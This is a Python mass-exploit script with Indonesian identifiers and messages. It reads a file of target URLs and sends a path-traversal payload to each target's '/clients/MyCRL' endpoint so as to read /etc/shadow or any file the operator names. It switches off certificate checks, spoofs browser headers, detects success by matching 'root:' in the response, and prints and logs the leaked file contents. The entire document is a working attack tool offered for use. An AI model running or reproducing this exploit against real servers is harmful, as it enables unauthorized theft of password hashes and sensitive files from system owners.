import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init

init(autoreset=True)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

header_custom = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Connection": "keep-alive",
    "Referer": "https://www.google.com/",
    "Origin": "https://www.google.com/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1"
}

cek_vuln = ['root:', 'nobody:']

def jalankan_scan(target, injeksi=None, headers=None, timeout=10):
    try:
        res = requests.post(target, data=injeksi, headers=headers, verify=False)
        if res.ok:
            for tanda in cek_vuln:
                if tanda in res.text:
                    hasil = f"[+] {target} BERHASIL di-eksploitasi!"
                    print(Fore.GREEN + hasil)
                    simpan_log(hasil)
                    tampilkan_hasil(res.text, injeksi)
                    return
            print(Fore.RED + f"[-] {target} TIDAK rentan.")
        else:
            print(Fore.YELLOW + f"[-] {target} Respon: {res.status_code}")
    except requests.RequestException as err:
        print(Fore.RED + f"[ERROR] Gagal mengakses {target}: {err}")

def simpan_log(hasil):
    with open("hasil_scan.txt", "a") as file:
        file.write(hasil + "\n")

def tampilkan_hasil(isi, injeksi):
    print(Fore.CYAN + "=" * 60)
    if injeksi and "shadow" in injeksi:
        print(Fore.RED + "   ðŸ”¥ Berhasil Menemukan /etc/shadow ðŸ”¥")
    else:
        print(Fore.GREEN + "   âœ… Berhasil Membaca File âœ…")
    print(Fore.CYAN + "=" * 60)
    print(Fore.MAGENTA + isi)
    print(Fore.CYAN + "=" * 60)

def mulai():
    parser = argparse.ArgumentParser(description="Scanner Keamanan - Custom Exploit")
    parser.add_argument("-t", metavar='target_list', type=str, help="File berisi daftar target")
    parser.add_argument("-c", metavar='custom_file', type=str, help="Baca file lain (default: /etc/shadow)")
    args = parser.parse_args()

    injeksi_path = "aCSHELL/../../../../../../../{}".format(args.c if args.c else "etc/shadow")

    if args.t:
        try:
            with open(args.t, 'r') as file:
                daftar_target = file.readlines()
                for link in daftar_target:
                    link = link.strip()
                    if link.startswith('http'):
                        jalankan_scan(link + '/clients/MyCRL', injeksi=injeksi_path, headers=header_custom)
                    else:
                        print(Fore.YELLOW + f"[SKIP] URL tidak valid: {link}")
        except FileNotFoundError:
            print(Fore.RED + f"[ERROR] File '{args.t}' tidak FOUND.")
    else:
        print(Fore.CYAN + "Gunakan -t untuk daftar target!")

if __name__ == "__main__":
    mulai()